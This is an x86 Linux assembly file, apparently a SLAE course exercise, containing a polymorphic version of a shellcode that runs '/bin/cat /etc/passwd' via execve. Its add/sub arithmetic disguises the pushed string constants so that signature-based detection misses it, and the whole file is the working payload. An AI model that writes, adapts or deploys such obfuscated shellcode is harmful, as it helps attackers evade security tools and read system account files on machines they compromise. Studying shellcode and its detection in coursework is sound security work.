; Filename: passwd-polymorphic.nasm
; Author: SLAE-14209

global _start           
section .text
_start:
     
    ;xor eax,eax
    sub eax, eax
    
    cdq
    push edx
    ;push 0x7461632f         ; "tac/"
    add eax, 0x6350521e
    add eax, 0x11111111
    push eax
    xor eax, eax
    
    ;push 0x6e69622f         ; "nib/"
    add eax, 0x7F7A7340
    sub eax, 0x11111111
    push eax
    xor eax, eax
    
    ;mov ebx,esp
    push esp
    pop ebx
 
    push edx
    push 0x64777373          ; "dwss"
    push 0x61702f2f          ; "ap//"    
    push 0x6374652f          ; "cte/"
    mov ecx, esp
   
    ;mov al,0xb
    mov al, 11
    
    push edx
    push ecx
    push ebx
    mov ecx, esp
    int 0x80   
